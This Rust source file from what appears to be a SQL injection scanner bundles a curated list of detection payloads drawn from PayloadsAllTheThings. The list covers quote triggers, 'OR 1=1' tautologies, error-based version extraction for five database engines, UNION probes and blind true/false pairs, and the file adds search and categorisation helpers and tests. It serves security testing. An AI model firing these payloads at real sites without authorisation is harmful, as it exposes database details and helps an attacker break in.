//! Bundled SQL Injection Payloads (MIT License)
//!
//! Curated subset from PayloadsAllTheThings (MIT License).
//! Source: https://github.com/swisskyrepo/PayloadsAllTheThings
//! Only detection/fingerprint payloads included — no destructive statements.

/// Error-based and detection payloads bundled with SQX.
/// These are always available without needing to fetch external sources.
pub static BUNDLED_ERROR_PAYLOADS: &[&str] = &[
    // Generic triggers
    "'",
    "\"",
    "`",
    "\\",
    "%27",
    "%22",
    "''",
    "\"\"",
    "' '",
    "\" \"",
    // Boolean logic
    "' OR '1'='1",
    "' OR 1=1-- ",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "\" OR 1=1-- ",
    "1 OR 1=1",
    "1' OR '1'='1",
    // Error triggers — MySQL
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- ",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- ",
    "' AND EXP(~(SELECT * FROM (SELECT version())x))-- ",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- ",
    // Error triggers — MSSQL
    "' AND 1=CONVERT(INT,(SELECT @@version))-- ",
    "'; WAITFOR DELAY '0:0:0'-- ",
    "' AND 1=(SELECT TOP 1 CAST(name AS INT) FROM sys.tables)-- ",
    // Error triggers — PostgreSQL
    "' AND 1=CAST(version() AS INT)-- ",
    "' AND 1=(SELECT CAST(current_database() AS INT))-- ",
    // Error triggers — Oracle
    "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))-- ",
    "' AND XMLTYPE((SELECT banner FROM v$version WHERE rownum=1))=1-- ",
    // Error triggers — SQLite
    "' AND 1=sqlite_version()-- ",
    "' UNION SELECT sqlite_version()-- ",
    // UNION fingerprint
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
    // Blind detection
    "' AND 1=1-- ",
    "' AND 1=2-- ",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1 AND 1=1",
    "1 AND 1=2",
    // ── Double-quote string contexts (High Priority Gap) ───────────────────────
    "\" AND 1=1-- ",
    "\" AND 1=2-- ",
    "\" AND \"a\"=\"a",
    "\" AND \"a\"=\"b",
    // ── LIKE clause contexts (High Priority Gap) ───────────────────────────────
    "%' AND 1=1-- ",
    "%' AND 1=2-- ",
    "%' AND '%'='",
    "%' AND '%'='x",
    // ── IN clause contexts (High Priority Gap) ─────────────────────────────────
    ") AND 1=1-- ",
    ") AND 1=2-- ",
    ") AND (1=1",
    ") AND (1=2",
    // ── ORDER BY contexts (High Priority Gap) ──────────────────────────────────
    ",1) AND (1=1-- ",
    ",1) AND (1=2-- ",
];

/// Get all bundled payloads.
pub fn get_bundled_payloads() -> &'static [&'static str] {
    BUNDLED_ERROR_PAYLOADS
}

/// Get payloads filtered by a simple keyword search.
pub fn find_payloads_containing(keyword: &str) -> Vec<&'static str> {
    BUNDLED_ERROR_PAYLOADS
        .iter()
        .filter(|&&p| p.to_lowercase().contains(&keyword.to_lowercase()))
        .copied()
        .collect()
}

/// Categorize payloads by their likely target DBMS.
pub fn payloads_by_category() -> std::collections::HashMap<&'static str, Vec<&'static str>> {
    let mut map = std::collections::HashMap::new();
    
    map.insert("generic", vec![
        "'", "\"", "`", "\\", "''", "\"\"",
    ]);
    
    map.insert("boolean", vec![
        "' OR '1'='1", "' OR 1=1-- ", "1 OR 1=1",
        "' AND 1=1-- ", "' AND 1=2-- ",
    ]);
    
    map.insert("mysql", vec![
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- ",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- ",
    ]);
    
    map.insert("mssql", vec![
        "' AND 1=CONVERT(INT,(SELECT @@version))-- ",
        "'; WAITFOR DELAY '0:0:0'-- ",
    ]);
    
    map.insert("postgresql", vec![
        "' AND 1=CAST(version() AS INT)-- ",
    ]);
    
    map.insert("oracle", vec![
        "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))-- ",
    ]);
    
    map.insert("sqlite", vec![
        "' AND 1=sqlite_version()-- ",
    ]);
    
    map.insert("union", vec![
        "' UNION SELECT NULL-- ",
        "' UNION SELECT NULL,NULL-- ",
    ]);
    
    map
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bundled_payloads_not_empty() {
        assert!(!BUNDLED_ERROR_PAYLOADS.is_empty());
    }

    #[test]
    fn find_mysql_payloads() {
        let mysql = find_payloads_containing("EXTRACTVALUE");
        assert!(!mysql.is_empty());
        for p in mysql {
            assert!(p.contains("EXTRACTVALUE"));
        }
    }

    #[test]
    fn categories_include_expected() {
        let cats = payloads_by_category();
        assert!(cats.contains_key("mysql"));
        assert!(cats.contains_key("mssql"));
        assert!(cats.contains_key("postgresql"));
        assert!(cats.contains_key("oracle"));
    }
}
